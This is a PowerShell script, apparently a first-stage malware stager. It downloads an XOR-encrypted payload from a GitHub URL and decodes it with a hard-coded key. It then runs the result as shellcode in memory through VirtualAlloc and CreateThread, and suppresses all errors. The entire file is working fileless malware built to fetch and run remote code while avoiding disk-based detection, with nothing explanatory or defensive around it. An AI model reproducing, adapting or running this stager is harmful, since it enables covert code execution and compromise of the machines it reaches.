# stage0.ps1
# This script downloads, de-obfuscates, and executes the C stager entirely in memory.

# The URL of your XORed C loader
$loaderUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor"

# The same key you used to XOR your loader
$xorKey = 'i0xuFnZOf69X7bktf3Vs'

# Define a minimal C# class to handle in-memory execution via P/Invoke
$CSharpCode = @"
using System;
using System.Runtime.InteropServices;

public class Executor {
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private static uint MEM_COMMIT = 0x1000;
    private static uint MEM_RESERVE = 0x2000;
    private static uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Execute(byte[] shellcode) {
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
        
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out threadId);
        
        WaitForSingleObject(hThread, 0xFFFFFFFF); // Wait indefinitely for the thread to finish
    }
}
"@

# Add the C# type to the current PowerShell session
Add-Type -TypeDefinition $CSharpCode

# --- Main Logic ---
try {
    # 1. Download the XORed loader into a memory buffer (byte array)
    $webClient = New-Object System.Net.WebClient
    $xorBytes = $webClient.DownloadData($loaderUrl)

    # 2. De-obfuscate the loader in memory
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
    $keyLen = $keyBytes.Length
    for ($i = 0; $i -lt $xorBytes.Length; $i++) {
        $xorBytes[$i] = $xorBytes[$i] -bxor $keyBytes[$i % $keyLen]
    }

    # 3. Execute the de-obfuscated loader from the memory buffer
    [Executor]::Execute($xorBytes)
}
catch {
    # Fail silently
}
